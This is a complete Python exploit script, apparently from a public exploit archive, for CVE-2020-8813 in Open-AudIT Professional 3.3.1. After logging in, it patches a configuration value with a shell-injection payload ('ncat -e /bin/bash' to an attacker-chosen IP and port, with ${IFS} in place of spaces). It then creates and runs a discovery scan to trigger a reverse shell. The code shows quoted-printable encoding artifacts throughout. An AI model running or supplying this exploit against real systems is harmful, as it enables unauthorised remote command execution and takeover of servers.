# Exploit Title: Open-AudIT Professional 3.3.1 - Remote Code Execution
# Date: 2020-04-22
# Exploit Author: Askar
# CVE: CVE-2020-8813
# Vendor Homepage: https://opmantek.com/
# Version: v3.3.1
# Tested on: Ubuntu 18.04 / PHP 7.2.24

#!/usr/bin/python3

import requests
import sys
import warnings
import random
import string
from bs4 import BeautifulSoup
from urllib.parse import quote

warnings.filterwarnings("ignore", category=3DUserWarning, module=3D'bs4')


if len(sys.argv) !=3D 6:
    print("[~] Usage : ./openaudit-exploit.py url username password ip port=
")
    exit()

url =3D sys.argv[1]
username =3D sys.argv[2]
password =3D sys.argv[3]
ip =3D sys.argv[4]
port =3D sys.argv[5]

request =3D requests.session()

def inject_payload():
    configuration_path =3D url+"/en/omk/open-audit/configuration/90"
    data =3D 'data=3D{"data":{"id":"90","type":"configuration","attributes"=
:{"value":";ncat${IFS}-e${IFS}/bin/bash${IFS}%s${IFS}%s${IFS};"}}}' % (ip, =
port)
    request.patch(configuration_path, data)
    print("[+] Payload injected in settings")


def start_discovery():
    discovery_path =3D url+"/en/omk/open-audit/discoveries/create"
    post_discovery_path =3D url+"/en/omk/open-audit/discoveries"
    scan_name =3D "".join([random.choice(string.ascii_uppercase) for i in r=
ange(10)])
    req =3D request.get(discovery_path)

    response =3D req.text
    soup =3D BeautifulSoup(response, "html5lib")
    token =3D soup.findAll('input')[5].get("value")
    buttons =3D soup.findAll("button")
    headers =3D {"Referer" : discovery_path}
    request_data =3D {
    "data[attributes][name]":scan_name,
    "data[attributes][other][subnet]":"10.10.10.1/24",
    "data[attributes][other][ad_server]":"",
    "data[attributes][other][ad_domain]":"",
    "submit":"",
    "data[type]":"discoveries",
    "data[access_token]":token,
    "data[attributes][complete]":"y",
    "data[attributes][org_id]":"1",
    "data[attributes][type]":"subnet",
    "data[attributes][devices_assigned_to_org]":"",
    "data[attributes][devices_assigned_to_location]":"",
    "data[attributes][other][nmap][discovery_scan_option_id]":"1",
    "data[attributes][other][nmap][ping]":"y",
    "data[attributes][other][nmap][service_version]":"n",
    "data[attributes][other][nmap][open|filtered]":"n",
    "data[attributes][other][nmap][filtered]":"n",
    "data[attributes][other][nmap][timing]":"4",
    "data[attributes][other][nmap][nmap_tcp_ports]":"0",
    "data[attributes][other][nmap][nmap_udp_ports]":"0",
    "data[attributes][other][nmap][tcp_ports]":"22,135,62078",
    "data[attributes][other][nmap][udp_ports]":"161",
    "data[attributes][other][nmap][timeout]":"",
    "data[attributes][other][nmap][exclude_tcp_ports]":"",
    "data[attributes][other][nmap][exclude_udp_ports]":"",
    "data[attributes][other][nmap][exclude_ip]":"",
    "data[attributes][other][nmap][ssh_ports]":"22",
    "data[attributes][other][match][match_dbus]":"",
    "data[attributes][other][match][match_fqdn]":"",
    "data[attributes][other][match][match_dns_fqdn]":"",
    "data[attributes][other][match][match_dns_hostname]":"",
    "data[attributes][other][match][match_hostname]":"",
    "data[attributes][other][match][match_hostname_dbus]":"",
    "data[attributes][other][match][match_hostname_serial]":"",
    "data[attributes][other][match][match_hostname_uuid]":"",
    "data[attributes][other][match][match_ip]":"",
    "data[attributes][other][match][match_ip_no_data]":"",
    "data[attributes][other][match][match_mac]":"",
    "data[attributes][other][match][match_mac_vmware]":"",
    "data[attributes][other][match][match_serial]":"",
    "data[attributes][other][match][match_serial_type]":"",
    "data[attributes][other][match][match_sysname]":"",
    "data[attributes][other][match][match_sysname_serial]":"",
    "data[attributes][other][match][match_uuid]":""

    }
    print("[+] Creating discovery ..")
    req =3D request.post(post_discovery_path, data=3Drequest_data, headers=
=3Dheaders, allow_redirects=3DFalse)
    disocvery_url =3D url + req.headers['Location'] + "/execute"
    print("[+] Triggering payload ..")
    print("[+] Check your nc ;)")
    request.get(disocvery_url)


def login():
    login_info =3D {
    "redirect_url": "/en/omk/open-audit",
    "username": username,
    "password": password
    }
    login_request =3D request.post(url+"/en/omk/open-audit/login", login_in=
fo)
    login_text =3D login_request.text
    if "There was an error authenticating" in login_text:
        return False
    else:
        return True

if login():
    print("[+] LoggedIn Successfully")
    inject_payload()
    start_discovery()
else:
    print("[-] Cannot login!")